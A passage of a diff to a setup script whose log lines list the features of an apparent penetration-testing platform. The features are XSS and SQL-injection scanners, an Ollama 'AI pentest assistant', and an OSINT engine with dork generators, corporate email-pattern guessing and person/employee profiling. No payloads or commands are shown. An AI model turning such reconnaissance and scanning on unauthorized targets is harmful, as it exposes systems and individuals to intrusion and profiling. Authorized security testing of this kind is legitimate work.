+log "OK" "      • XSS via plugins/xss_scanner.py (12 payloads incl. polyglots)"
+log "OK" "      • SQLi via plugins/sqli_scanner.py (error/boolean/time-based + sqlmap)"
+log "OK" "  ✓ POST /scans/{id}/webvuln     — Run full web vuln scan on a URL within a scan"
+log "OK" "  ✓ POST /webvuln                — Standalone quick web vuln check"
+log "OK" "  ── AI ASSISTANT (OLLAMA) ──"
+log "OK" "  ✓ plugins/ai_chat.py           — Ollama-powered AI pentest assistant:"
+log "OK" "      • Scan-context-aware (injects target, CVEs, services into system prompt)"
+log "OK" "      • Multi-turn conversation with history (last 20 turns)"
+log "OK" "      • Configurable model via OLLAMA_MODEL env var (default: llama3)"
+log "OK" "      • Configurable Ollama URL via OLLAMA_BASE_URL env var"
+log "OK" "  ✓ GET  /ai/status              — Check if Ollama is running + list models"
+log "OK" "  ✓ POST /ai/chat                — Chat with AI (with optional scan context)"
+log "OK" "  ✓ GET  /ai/models              — List available Ollama models"
+log "OK" "  ✓ POST /ai/pull                — Pull a new Ollama model (admin only)"
+log "OK" "  ── ADVANCED OSINT ──"
+log "OK" "  ✓ plugins/osint.py             — Full OSINT engine:"
+log "OK" "      • crt.sh CT logs           — passive subdomain mining (no key)"
+log "OK" "      • Shodan InternetDB         — passive port/CVE/tag lookup (no key)"
+log "OK" "      • BGPView                  — ASN, prefix, ISP, country (no key)"
+log "OK" "      • GreyNoise Community       — threat classification (no key)"
+log "OK" "      • URLScan.io               — historical page/screenshot history (no key)"
+log "OK" "      • IPInfo                   — geo, org, timezone (no key)"
+log "OK" "      • Wayback CDX              — archive first/last seen (no key)"
+log "OK" "      • HackerTarget             — reverse IP / shared hosting (no key)"
+log "OK" "      • WHOIS                    — registrar, dates, registrant"
+log "OK" "      • DNS records              — A, AAAA, MX, TXT, NS, SOA"
+log "OK" "      • HIBP                     — email breach check (OSINT_HIBP_KEY)"
+log "OK" "      • HIBP password            — k-anonymity password pwn check"
+log "OK" "      • Shodan full API          — deep service intel (OSINT_SHODAN_KEY)"
+log "OK" "      • VirusTotal               — domain/IP reputation (OSINT_VT_KEY)"
+log "OK" "      • AbuseIPDB                — abuse confidence score (OSINT_ABUSEIPDB_KEY)"
+log "OK" "      • Google dork generator    — 30+ dorks: site, filetype, pastebin, github, S3"
+log "OK" "      • Shodan dork generator    — hostname, SSL cert, org dorks"
+log "OK" "      • Email pattern generator  — 11 common corporate email formats"
+log "OK" "      • Person/employee OSINT    — name dorks, username candidates, social"
+log "OK" "  ✓ POST /osint/domain           — Full domain OSINT sweep"
+log "OK" "  ✓ POST /osint/ip               — Full IP OSINT sweep"
+log "OK" "  ✓ POST /osint/email            — Email breach + domain intel"
+log "OK" "  ✓ POST /osint/person           — Person/employee dorks + email patterns"
+log "OK" "  ✓ POST /osint/dorks            — Google + Shodan dork generation"
+log "OK" "  ✓ POST /osint/hibp/password    — k-anonymity password breach check"
+log "OK" "  ✓ POST /scans/{id}/osint       — Attach OSINT to existing scan"
+warn "Run: $BASE/start.sh to start all services"
+warn "AI Chat requires Ollama running locally: https://ollama.com/download"
+warn "Recommended models: ollama pull llama3  |  ollama pull mistral  |  ollama pull codellama"
+warn "Set OLLAMA_MODEL in $BASE/.env to change the active model"
+warn "NVD API key (free): https://nvd.nist.gov/developers/request-an-api-key — add to $BASE/.env"
